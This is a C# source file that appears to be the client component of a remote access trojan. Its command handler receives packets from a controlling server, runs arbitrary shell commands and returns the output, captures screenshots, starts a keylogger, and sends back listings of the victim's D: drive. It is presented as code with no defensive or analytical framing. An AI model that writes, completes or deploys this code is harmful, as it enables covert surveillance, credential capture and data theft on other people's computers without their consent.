using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SharedLibrary;

namespace Client
{
    class CommandHandler
    {
        private ServerConnection _connection;

        public CommandHandler(ServerConnection connection)
        {
            _connection = connection;
        }

        public void Handle(Packet packet)
        {
            switch(packet.Command)
            {
                case "CMD":
                    string result = CmdExecutor.Execute(packet.Data);
                    _connection.Send(new Packet { Command = "CMD_RESULT", Data = result });
                    break;

                case "SCREEN":
                    byte[] img = ScreenCaptureService.Capture();
                    _connection.Send(new Packet { Command = "SCREEN_RESULT", BinaryData = img });
                    break;

                case "KEYLOG_START":
                    KeyloggerService.Start();
                    //still need to send the keylogs to server (and editing the class (KeyloggerService) to return the keylogs) here .
                    break;

                case "FILES":
                    string files = FileManager.GetFiles("D:\\");
                    _connection.Send(new Packet { Command = "FILES_RESULT", Data = files });
                    break;
            }
        }
    }
}
